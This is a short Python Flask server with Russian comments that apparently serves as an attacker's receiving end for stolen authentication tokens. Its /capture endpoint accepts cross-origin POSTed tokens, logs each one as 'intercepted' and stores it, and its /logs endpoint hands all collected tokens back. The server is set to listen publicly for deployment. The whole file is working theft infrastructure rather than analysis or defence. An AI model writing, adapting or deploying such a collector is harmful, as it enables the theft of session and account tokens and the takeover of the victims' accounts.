from flask import Flask, request, jsonify
import os  # <-- Добавляем импорт os

app = Flask(__name__)
tokens = []

@app.route('/capture', methods=['POST', 'OPTIONS'])
def capture():
    if request.method == 'OPTIONS':
        return '', 200
    data = request.get_json()
    print("Получены данные:", data)
    if data and 'token' in data:
        tokens.append(data)
        print(f"[+] Токен перехвачен: {data['token']}")
        return '', 200
    return '', 400

@app.route('/logs', methods=['GET'])
def logs():
    return jsonify(tokens)

if __name__ == '__main__':
    # Используем порт из переменной окружения PORT или 5000 по умолчанию
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)